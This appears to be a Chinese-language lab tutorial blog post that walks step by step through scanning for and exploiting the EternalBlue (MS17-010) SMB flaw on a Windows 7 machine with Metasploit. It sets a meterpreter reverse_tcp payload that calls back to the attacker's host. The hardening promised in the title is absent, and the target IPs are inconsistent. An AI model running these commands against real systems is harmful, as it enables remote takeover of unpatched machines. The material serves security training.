---
cover: https://weboffice.feishu-3rd-party-services.com/api/v3/office/copy/OGJHWS9KMjdkR1dGQWcxaVFzUXZFQm1LZ1V1bW83SmxaRFEweGFvT3luTkFaZ0hhYVhJUWxNRU41UzJSU1I2ZUhyUlhEZS9TMTlZRUE3YjNxbTNEeW9EYXU3OU40Rnh5eHNVUDY5WmJvdFMrcFg4RFZmRXl4aUJPeTY5bjdOVXpmSExTSzJUMDAyempxbkFEQ2QvOGxjU0dpN0JualRzQmxsRTJzdVNLQmlrV0xEKzFOZFVlUEI3RVlyM20vSklDUWNzcDFmS09YM1dGZUc0NW1wVG5FaE1wQ3dLZXB4dWxLMkFETnNQbjhmK0k0TVFnMG85Wklnb3RXbS9aeWFtZFJjQWREWG0rY3pOWDNYL1g1YkZKTUM4bE5Td1dDM3M9/attach/object/5542320f14e9c30450aabb446e67d9066cb88371?
icon: pen-to-square
date: 2025-03-19
category:
  - 经典漏洞
tag:
  - 永恒之蓝ms17-010
star: false
sticky: true
---

# 永恒之蓝ms17-010

MS17_010漏洞利用与安全加固（永恒之蓝）

之前做过就直接放出来啦

- 原理：

恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。

- 开始

1.断开防火墙，windos 7 的防火墙关闭

![img](https://weboffice.feishu-3rd-party-services.com/api/v3/office/copy/OGJHWS9KMjdkR1dGQWcxaVFzUXZFQm1LZ1V1bW83SmxaRFEweGFvT3luTkFaZ0hhYVhJUWxNRU41UzJSU1I2ZUhyUlhEZS9TMTlZRUE3YjNxbTNEeW9EYXU3OU40Rnh5eHNVUDY5WmJvdFMrcFg4RFZmRXl4aUJPeTY5bjdOVXpmSExTSzJUMDAyempxbkFEQ2QvOGxjU0dpN0JualRzQmxsRTJzdVNLQmlrV0xEKzFOZFVlUEI3RVlyM20vSklDUWNzcDFmS09YM1dGZUc0NW1wVG5FaE1wQ3dLZXB4dWxLMkFETnNQbjhmK0k0TVFnMG85Wklnb3RXbS9aeWFtZFJjQWREWG0rY3pOWDNYL1g1YkZKTUM4bE5Td1dDM3M9/attach/object/19cf8d2c68de0d214db6221d8162b4febbf3be40?)

2.实现相互ping通

![img](https://weboffice.feishu-3rd-party-services.com/api/v3/office/copy/OGJHWS9KMjdkR1dGQWcxaVFzUXZFQm1LZ1V1bW83SmxaRFEweGFvT3luTkFaZ0hhYVhJUWxNRU41UzJSU1I2ZUhyUlhEZS9TMTlZRUE3YjNxbTNEeW9EYXU3OU40Rnh5eHNVUDY5WmJvdFMrcFg4RFZmRXl4aUJPeTY5bjdOVXpmSExTSzJUMDAyempxbkFEQ2QvOGxjU0dpN0JualRzQmxsRTJzdVNLQmlrV0xEKzFOZFVlUEI3RVlyM20vSklDUWNzcDFmS09YM1dGZUc0NW1wVG5FaE1wQ3dLZXB4dWxLMkFETnNQbjhmK0k0TVFnMG85Wklnb3RXbS9aeWFtZFJjQWREWG0rY3pOWDNYL1g1YkZKTUM4bE5Td1dDM3M9/attach/object/059fa32660139a8113de7aaa7277891edee1cb56?)

![img](https://weboffice.feishu-3rd-party-services.com/api/v3/office/copy/OGJHWS9KMjdkR1dGQWcxaVFzUXZFQm1LZ1V1bW83SmxaRFEweGFvT3luTkFaZ0hhYVhJUWxNRU41UzJSU1I2ZUhyUlhEZS9TMTlZRUE3YjNxbTNEeW9EYXU3OU40Rnh5eHNVUDY5WmJvdFMrcFg4RFZmRXl4aUJPeTY5bjdOVXpmSExTSzJUMDAyempxbkFEQ2QvOGxjU0dpN0JualRzQmxsRTJzdVNLQmlrV0xEKzFOZFVlUEI3RVlyM20vSklDUWNzcDFmS09YM1dGZUc0NW1wVG5FaE1wQ3dLZXB4dWxLMkFETnNQbjhmK0k0TVFnMG85Wklnb3RXbS9aeWFtZFJjQWREWG0rY3pOWDNYL1g1YkZKTUM4bE5Td1dDM3M9/attach/object/f45d19634ae5aeda8da83028965408e64778ab7d?)

环境弄好了，正文开始！172.16.17.0

3.在kali当中启动metasploit工具，

通过执行msfconsole指令进行启动。

![img](https://weboffice.feishu-3rd-party-services.com/api/v3/office/copy/OGJHWS9KMjdkR1dGQWcxaVFzUXZFQm1LZ1V1bW83SmxaRFEweGFvT3luTkFaZ0hhYVhJUWxNRU41UzJSU1I2ZUhyUlhEZS9TMTlZRUE3YjNxbTNEeW9EYXU3OU40Rnh5eHNVUDY5WmJvdFMrcFg4RFZmRXl4aUJPeTY5bjdOVXpmSExTSzJUMDAyempxbkFEQ2QvOGxjU0dpN0JualRzQmxsRTJzdVNLQmlrV0xEKzFOZFVlUEI3RVlyM20vSklDUWNzcDFmS09YM1dGZUc0NW1wVG5FaE1wQ3dLZXB4dWxLMkFETnNQbjhmK0k0TVFnMG85Wklnb3RXbS9aeWFtZFJjQWREWG0rY3pOWDNYL1g1YkZKTUM4bE5Td1dDM3M9/attach/object/5542320f14e9c30450aabb446e67d9066cb88371?)

4.Search命令搜索ms17-010漏洞扫描模块，图中圈中的就是漏洞扫描模块。

执行：

```
search ms17-010 //搜索ms17-010相关漏洞利用模块
```

![img](https://weboffice.feishu-3rd-party-services.com/api/v3/office/copy/OGJHWS9KMjdkR1dGQWcxaVFzUXZFQm1LZ1V1bW83SmxaRFEweGFvT3luTkFaZ0hhYVhJUWxNRU41UzJSU1I2ZUhyUlhEZS9TMTlZRUE3YjNxbTNEeW9EYXU3OU40Rnh5eHNVUDY5WmJvdFMrcFg4RFZmRXl4aUJPeTY5bjdOVXpmSExTSzJUMDAyempxbkFEQ2QvOGxjU0dpN0JualRzQmxsRTJzdVNLQmlrV0xEKzFOZFVlUEI3RVlyM20vSklDUWNzcDFmS09YM1dGZUc0NW1wVG5FaE1wQ3dLZXB4dWxLMkFETnNQbjhmK0k0TVFnMG85Wklnb3RXbS9aeWFtZFJjQWREWG0rY3pOWDNYL1g1YkZKTUM4bE5Td1dDM3M9/attach/object/685b6b2224ca4f08991002b99fa745f515fdb77b?)

执行：

```
msf > use auxiliary/scanner/smb/smb_ms17_010 （利用模块该扫描模块并且设置相关扫描范围信息）。**
```

执行：

```
use auxiliary/scanner/smb/smb_ms17_010 //选择使用该模块执行搜索选项

set rhosts 192.168.6.0/24 //设置扫描的网段范围

set threads 20 //设置扫描的线程，数值越大扫描速度越快

run //开始运行即开始执行扫描
```

![img](https://weboffice.feishu-3rd-party-services.com/api/v3/office/copy/OGJHWS9KMjdkR1dGQWcxaVFzUXZFQm1LZ1V1bW83SmxaRFEweGFvT3luTkFaZ0hhYVhJUWxNRU41UzJSU1I2ZUhyUlhEZS9TMTlZRUE3YjNxbTNEeW9EYXU3OU40Rnh5eHNVUDY5WmJvdFMrcFg4RFZmRXl4aUJPeTY5bjdOVXpmSExTSzJUMDAyempxbkFEQ2QvOGxjU0dpN0JualRzQmxsRTJzdVNLQmlrV0xEKzFOZFVlUEI3RVlyM20vSklDUWNzcDFmS09YM1dGZUc0NW1wVG5FaE1wQ3dLZXB4dWxLMkFETnNQbjhmK0k0TVFnMG85Wklnb3RXbS9aeWFtZFJjQWREWG0rY3pOWDNYL1g1YkZKTUM4bE5Td1dDM3M9/attach/object/9f4cb8772045a743716175901d45c9571aa3a54b?)

6.执行扫描过后，结果如下所示，从结果中可以看到在当前扫描的网段中存在一个windows 7版本的操作系统存在ms17-010漏洞。（192.168.6.135就是window 7的IP）

![img](https://weboffice.feishu-3rd-party-services.com/api/v3/office/copy/OGJHWS9KMjdkR1dGQWcxaVFzUXZFQm1LZ1V1bW83SmxaRFEweGFvT3luTkFaZ0hhYVhJUWxNRU41UzJSU1I2ZUhyUlhEZS9TMTlZRUE3YjNxbTNEeW9EYXU3OU40Rnh5eHNVUDY5WmJvdFMrcFg4RFZmRXl4aUJPeTY5bjdOVXpmSExTSzJUMDAyempxbkFEQ2QvOGxjU0dpN0JualRzQmxsRTJzdVNLQmlrV0xEKzFOZFVlUEI3RVlyM20vSklDUWNzcDFmS09YM1dGZUc0NW1wVG5FaE1wQ3dLZXB4dWxLMkFETnNQbjhmK0k0TVFnMG85Wklnb3RXbS9aeWFtZFJjQWREWG0rY3pOWDNYL1g1YkZKTUM4bE5Td1dDM3M9/attach/object/e72fe4f5ba4516364f71a30d835c6b8b92773e9c?)

192.168.32.136:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)

7.接下来进行漏洞利用过程即可，

执行：

```
use exploit/windows/smb/ms17_010_eternalblue //选择漏洞利用模块

set payload windows/x64/meterpreter/reverse_tcp //设置漏洞利用完成后的反弹模块，用以接收回馈信息

set lhost 192.168.6.130//设置反弹IP地址

set lport 5555 //设置反弹端口

set rhost 192.168.6.135 //设置被攻击的目标主机
```

﻿![img](https://weboffice.feishu-3rd-party-services.com/api/v3/office/copy/OGJHWS9KMjdkR1dGQWcxaVFzUXZFQm1LZ1V1bW83SmxaRFEweGFvT3luTkFaZ0hhYVhJUWxNRU41UzJSU1I2ZUhyUlhEZS9TMTlZRUE3YjNxbTNEeW9EYXU3OU40Rnh5eHNVUDY5WmJvdFMrcFg4RFZmRXl4aUJPeTY5bjdOVXpmSExTSzJUMDAyempxbkFEQ2QvOGxjU0dpN0JualRzQmxsRTJzdVNLQmlrV0xEKzFOZFVlUEI3RVlyM20vSklDUWNzcDFmS09YM1dGZUc0NW1wVG5FaE1wQ3dLZXB4dWxLMkFETnNQbjhmK0k0TVFnMG85Wklnb3RXbS9aeWFtZFJjQWREWG0rY3pOWDNYL1g1YkZKTUM4bE5Td1dDM3M9/attach/object/225a888c5a6d86597f95eed9ad76e747f952e48c?)﻿

执行：

```
show options //检查设定的信息
```

﻿![img](https://weboffice.feishu-3rd-party-services.com/api/v3/office/copy/OGJHWS9KMjdkR1dGQWcxaVFzUXZFQm1LZ1V1bW83SmxaRFEweGFvT3luTkFaZ0hhYVhJUWxNRU41UzJSU1I2ZUhyUlhEZS9TMTlZRUE3YjNxbTNEeW9EYXU3OU40Rnh5eHNVUDY5WmJvdFMrcFg4RFZmRXl4aUJPeTY5bjdOVXpmSExTSzJUMDAyempxbkFEQ2QvOGxjU0dpN0JualRzQmxsRTJzdVNLQmlrV0xEKzFOZFVlUEI3RVlyM20vSklDUWNzcDFmS09YM1dGZUc0NW1wVG5FaE1wQ3dLZXB4dWxLMkFETnNQbjhmK0k0TVFnMG85Wklnb3RXbS9aeWFtZFJjQWREWG0rY3pOWDNYL1g1YkZKTUM4bE5Td1dDM3M9/attach/object/88b6870c3fb2984fcdf44c9035c10babdc66ccb8?)﻿

9.

执行：

```
run
```

或

```
exploit //开始进行漏洞利用
```

﻿![img](https://weboffice.feishu-3rd-party-services.com/api/v3/office/copy/OGJHWS9KMjdkR1dGQWcxaVFzUXZFQm1LZ1V1bW83SmxaRFEweGFvT3luTkFaZ0hhYVhJUWxNRU41UzJSU1I2ZUhyUlhEZS9TMTlZRUE3YjNxbTNEeW9EYXU3OU40Rnh5eHNVUDY5WmJvdFMrcFg4RFZmRXl4aUJPeTY5bjdOVXpmSExTSzJUMDAyempxbkFEQ2QvOGxjU0dpN0JualRzQmxsRTJzdVNLQmlrV0xEKzFOZFVlUEI3RVlyM20vSklDUWNzcDFmS09YM1dGZUc0NW1wVG5FaE1wQ3dLZXB4dWxLMkFETnNQbjhmK0k0TVFnMG85Wklnb3RXbS9aeWFtZFJjQWREWG0rY3pOWDNYL1g1YkZKTUM4bE5Td1dDM3M9/attach/object/b498df2268003c1ad5dd728e2bb4bf61bb6ce4a5?)﻿

看到WIN了吗？你就成功了！！！
